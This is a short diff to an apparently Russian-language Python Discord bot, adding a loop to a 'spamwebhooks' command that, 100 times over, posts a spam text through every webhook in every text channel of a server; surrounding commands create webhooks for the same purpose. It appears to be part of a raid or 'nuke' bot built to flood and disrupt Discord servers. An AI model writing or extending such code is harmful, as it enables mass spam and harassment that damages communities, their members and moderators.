@@ -207,6 +207,13 @@ async def spamwebhooks(ctx):
         except:
             print(f'Не создал хук на канал {channel.name}')
 
+    for i in range(100):
+        for ch in ctx.guild.text_channels:
+            hooklist = await ch.webhooks()
+            for hook in hooklist:
+                for i in range(1):
+                    await hook.send(content=spamtextn, wait=True)
+
 @client.command()
 async def spamwebhook1(ctx):
             await ctx.message.channel.create_webhook(name=hooknamen)
